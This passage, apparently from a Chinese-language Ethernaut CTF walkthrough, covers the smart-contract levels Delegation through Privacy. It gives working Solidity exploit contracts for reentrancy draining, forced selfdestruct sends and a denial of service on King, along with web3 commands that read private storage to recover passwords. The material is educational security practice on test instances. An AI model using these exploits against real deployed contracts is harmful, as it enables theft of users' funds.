delegate.delegatecall(msg.data) 其实调用的是 delegate 自身的 msg.data\n\ndata 头4个 byte 是被调用方法的签名哈希，即 bytes4(keccak256(&quot;func&quot;)) , remix 里调用函数，实际是向合约账户地址发送了( msg.data[0:4] == 函数签名哈希 )的一笔交易\n所以我们只需调用 Delegation 的 fallback 的同时在 msg.data 放入 pwn 函数的签名即可\n\nfallback 的触发条件：\n\n一是如果合约在被调用的时候，找不到对方调用的函数，就会自动调用 fallback 函数\n二是只要是合约收到别人发送的 Ether 且没有数据，就会尝试执行 fallback 函数，此时 fallback 需要带有 payable 标记，否则，合约就会拒绝这个 Ether\n\n\n\n所以，通过转账触发 Delegation 合约的 fallback 函数，同时设置 data 为 pwn 函数的标识符。\n攻击流程//sha3的返回值前两个为0x，所以要切0-10个字符。contract.sendTransaction(&#123;data: web3.utils.sha3(&quot;pwn()&quot;).slice(0,10)&#125;);\n\n可能会out of gas，提高gas上限即可\n\n7. Force闯关要求使合约的余额大于0\n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Force &#123;/*                   MEOW ?         /\\_/\\   /    ____/ o o \\  /~____  =ø= / (______)__m_m)*/&#125;\n\n合约分析在以太坊里我们是可以强制给一个合约发送eth的，不管它要不要它都得收下，这是通过selfdestruct函数来实现的，如它的名字所显示的，这是一个自毁函数，当你调用它的时候，它会使该合约无效化并删除该地址的字节码，然后它会把合约里剩余的资金发送给参数所指定的地址，比较特殊的是这笔资金的发送将无视合约的fallback函数，因为我们之前也提到了当合约直接收到一笔不知如何处理的eth时会触发fallback函数，然而selfdestruct的发送将无视这一点。\n攻击流程pragma solidity 0.4.20;contract Force &#123;    function Force() public payable &#123;&#125;    function attack(address _target) public &#123;        selfdestruct(_target);    &#125;&#125;\n\n可以用getBalance(instance)来查询实例余额\n记得部署合约的时候存一点钱进去\n\n8. Vault闯关要求打开 vault 来通过这一关!\n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Vault &#123;  bool public locked;  bytes32 private password;  constructor(bytes32 _password) public &#123;    locked = true;    password = _password;  &#125;  function unlock(bytes32 _password) public &#123;    if (password == _password) &#123;      locked = false;    &#125;  &#125;&#125;\n\n合约分析使用web3.eth.getStorageAt()方法返回一个以太坊地址的指定位置存储内容，借此获得密码内容\n\n攻击流程\nweb3.eth.getStorageAt(contract.address, 1)\n\n\ncontract.unlock(&#39;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&#39;)\n均报错\n\n成功\n\n\n\n\n9. King闯关要求下面的合约表示了一个很简单的游戏: 任何一个发送了高于目前价格的人将成为新的国王. 在这个情况下, 上一个国王将会获得新的出价, 这样可以赚得一些以太币. 看起来像是庞氏骗局.\n这么有趣的游戏, 你的目标是攻破他.\n当你提交实例给关卡时, 关卡会重新申明王位. 你需要阻止他重获王位来通过这一关.\n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract King &#123;  address payable king;  uint public prize;  address payable public owner;  constructor() public payable &#123;    owner = msg.sender;      king = msg.sender;    prize = msg.value;  &#125;  receive() external payable &#123;    require(msg.value &gt;= prize || msg.sender == owner);    king.transfer(msg.value);    king = msg.sender;    prize = msg.value;  &#125;  function _king() public view returns (address payable) &#123;    return king;  &#125;&#125;\n\n合约分析只要国王拒绝接收奖励即可一直当国王。那么我们可以部署攻击合约，使用 revert() 占据合约的king不放\n攻击流程\n查询目前最高价\nweb3.utils.fromWei 能将给定的以wei为单位的值转换为其他单位的数值。\nweb3.utils.fromWei(&#x27;1&#x27;, &#x27;ether&#x27;); //默认&gt; &quot;0.000000000000000001&quot;web3.utils.fromWei(&#x27;1&#x27;, &#x27;finney&#x27;);&gt; &quot;0.000000000000001&quot;web3.utils.fromWei(&#x27;1&#x27;, &#x27;szabo&#x27;);&gt; &quot;0.000000000001&quot;web3.utils.fromWei(&#x27;1&#x27;, &#x27;shannon&#x27;);&gt; &quot;0.000000001&quot;\n\n直接使用 fromWei(contract.prize) 会报错\n\n可使用 toBN() 转换一下\n\n即出价比0.001ether高即可\n\n查询现在的king\n\n\n部署合约\npragma solidity 0.4.18;contract attack &#123;    function attack(address _add) public payable &#123;        _add.call.gas(1000000).value(msg.value)();    &#125;    function () public &#123;        revert();    &#125;&#125;\n提交实例\n可以看到再次查询king的地址变为了攻击合约的地址\n\n\n\n10. Re-entrancy闯关要求这一关的目标是偷走合约的所有资产.\n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;contract Reentrance &#123;    using SafeMath for uint256;  mapping(address =&gt; uint) public balances;  function donate(address _to) public payable &#123;    balances[_to] = balances[_to].add(msg.value);  &#125;  function balanceOf(address _who) public view returns (uint balance) &#123;    return balances[_who];  &#125;  function withdraw(uint _amount) public &#123;    if(balances[msg.sender] &gt;= _amount) &#123;      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);      if(result) &#123;        _amount;      &#125;      balances[msg.sender] -= _amount;    &#125;  &#125;  receive() external payable &#123;&#125;&#125;\n\n合约分析重入\n攻击流程pragma solidity ^0.6.10;import &quot;@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol&quot;;contract Reentrance &#123;    using SafeMath for uint256;  mapping(address =&gt; uint) public balances;  function donate(address _to) public payable &#123;    balances[_to] = balances[_to].add(msg.value);  &#125;  function balanceOf(address _who) public view returns (uint balance) &#123;    return balances[_who];  &#125;  function withdraw(uint _amount) public &#123;    if(balances[msg.sender] &gt;= _amount) &#123;      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);      if(result) &#123;        _amount;      &#125;      balances[msg.sender] -= _amount;    &#125;  &#125;  receive() external payable &#123;&#125;&#125;contract exploit &#123;   //设定目标合约地址  Reentrance reentrance;  constructor(address payable instance_add) public payable &#123;    reentrance = Reentrance(instance_add);  &#125;  //重写fallback  fallback() external payable &#123;    if(address(reentrance).balance &gt;= 0 ether)&#123;      reentrance.withdraw(0.001 ether);    &#125;  &#125;  //攻击，调用withdraw  function attack() external &#123;    reentrance.donate&#123;value: 0.002 ether&#125;(address(this));    reentrance.withdraw(0.001 ether);  &#125;  //查询余额  function instance_balance() public view returns (uint) &#123;    return address(reentrance).balance;  &#125;   &#125;\n\n部署合约时打入一些钱\n\n使用函数查询实例合约中原有余额\n\n攻击完成后再次查询余额\n\n也可以在控制台中查询\n\n11. Elevator闯关要求电梯不会让你达到大楼顶部, 对吧?\n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.6.0;interface Building &#123;  function isLastFloor(uint) external returns (bool);&#125;contract Elevator &#123;  bool public top;  uint public floor;  function goTo(uint _floor) public &#123;    Building building = Building(msg.sender);    if (! building.isLastFloor(_floor)) &#123;      floor = _floor;      top = building.isLastFloor(floor);    &#125;  &#125;&#125;\n\n合约分析重新编写isLastFloor函数，并设置flag初始为true。在实例的goTo函数中，会调用两次isLastFloor函数，即第一次让flag变为false，第二次让flag变为true\n攻击流程pragma solidity ^0.6.0;interface Building &#123;  function isLastFloor(uint) external returns (bool);&#125;contract Elevator &#123;  bool public top;  uint public floor;  function goTo(uint _floor) public &#123;    Building building = Building(msg.sender);    if (! building.isLastFloor(_floor)) &#123;      floor = _floor;      top = building.isLastFloor(floor);    &#125;  &#125;&#125;contract exploit &#123;    address instance_add = 0x98aD02A12F92eADb16dcF5285568CA7826B4b947;    Elevator elevator = Elevator(instance_add);    bool flag = true;    function isLastFloor(uint) external returns (bool) &#123;        flag = !flag;        return flag;    &#125;    function attack() public &#123;        elevator.goTo(5);    &#125;&#125;\n\n查看top状态并提交实例\n\n12. Privacy闯关要求这个合约的制作者非常小心的保护了敏感区域的 storage.\n解开这个合约来完成这一关.\n合约代码// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Privacy &#123;  bool public locked = true;  uint256 public ID = block.timestamp;  uint8 private flattening = 10;  uint8 private denomination = 255;  uint16 private awkwardness = uint16(now);  bytes32[3] private data;  constructor(bytes32[3] memory _data) public &#123;    data = _data;  &#125;    function unlock(bytes16 _key) public &#123;    require(_key == bytes16(data[2]));    locked = false;  &#125;  /*    A bunch of super advanced solidity algorithms...      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\\      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU  */&#125;\n\n合约分析升级版vault，用 getStorageAt() 把链上的数据读出来\n攻击流程根据优化存储原则：如果下一个变量长度和上一个变量长度加起来不超过256bits（32字节），它们就会存储在同一个插槽里\n通过查询得到\n\n可以分析\nweb3.eth.getStorageAt(contract.address,0)//0x0000000000000000000000000000000000000000000000000000000000000001  //locked = true 1字节 01web3.eth.getStorageAt(contract.address,1)//0x0000000000000000000000000000000000000000000000000000000062178997  //ID = block.timestamp 常量web3.eth.getStorageAt(contract.address,2)//0x000000000000000000000000000000000000000000000000000000008997ff0a // flattening = 10 1字节 0a//denomination = 255 1字节 ff//awkwardness = uint16(now) 2字节web3.eth.getStorageAt(contract.address,3)//0xf29eea5d3875c68825a80d9c459dec52f5bbd55dd5ce827e00ec92ae60f7ddb2  //data[0]web3.eth.getStorageAt(contract.address,4)//0x153a7c6b4bf25f3a526a687713411c5ca83ae18c6f8950ff0f09be93bd36cb95  //data[1]web3.eth.getStorageAt(contract.address,5)//0x0b444a369c67e1d2436e5410d7c891644b6f088cb5f3451cc11f5ae67c451e18  //data[2]\n\n所以解锁需要的data[2]应该是0x0b444a369c67e1d2436e5410d7c89164\ncontract.unlock(&#x27;0x0b444a369c67e1d2436e5410d7c89164&#x27;)\n\n检查解锁成功\n\n提交实例\n\n"}]